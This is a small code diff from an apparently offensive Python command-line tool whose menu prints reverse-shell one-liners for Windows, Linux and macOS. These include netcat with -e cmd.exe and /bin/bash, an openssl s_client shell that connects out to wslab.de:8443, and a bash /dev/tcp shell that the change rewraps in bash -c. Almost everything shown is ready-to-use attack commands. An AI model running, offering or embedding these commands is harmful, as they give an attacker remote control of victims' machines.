@@ -91,7 +91,7 @@ class MyPrompt(Cmd):
         print("NETCAT (Windows): nc <ip> <port> -e cmd.exe")
         print("NETCAT (LINUX): nc <ip> <port> -e /bin/bash") 
         print("OS (LINUX): mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect wslab.de:8443 > /tmp/s; rm /tmp/s") 
-        print("OS (OSX): bash -i >& /dev/tcp/<ip>/<port> 0>&1") 
+        print("OS (OSX): bash -c \"bash -i >& /dev/tcp/<ip>/<port> 0>&1\"") 
         print("")
 
     def do_exit(self, inp):
